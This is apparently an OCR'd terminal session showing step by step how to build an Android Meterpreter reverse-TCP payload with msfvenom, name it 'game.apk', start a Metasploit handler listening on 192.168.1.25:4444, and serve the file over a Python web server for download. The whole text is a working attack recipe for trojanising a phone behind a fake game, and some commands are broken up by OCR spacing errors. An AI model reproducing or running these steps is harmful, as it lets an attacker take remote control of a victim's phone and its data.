# 1st creating a payload.apk
kim® kali)-[~/Desktop]
> msfvenom -p android/meterpreter/reverse_tcp LHOST= 192.168.1.25 LPORT=4444 -o game.apk
[-] No platform was selected, choosing Msf::Module:: Pl atform:: Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10232 bytes
Saved as: game.apk

(kim® kali)-[~/Desktop]
> ls
game.apk

> msfconsole
msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >  set payload android/meterpre ter/reverse_tcp

msf6 exploit(multi/handler) > show options
Payload options (android/meterpreter/reverse_tcp):
Name
Current Settin g Required
LHOST yes LPORT 4444. yes. Description
The listen address ( an interface

msf6 exploit(multi/handler) set LHOST 192.168.1.25
LHOST 192.168.1.25

msf6 exploit(multi/handler) > run 
[*] Started reverse TCP handler on 192.168.1.25:4444


-(kim®kali)-[~/Desktop]
> ls
game.apk
-(kim®kali)-[~/Desktop]
> python3 -m http.server 8080 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)






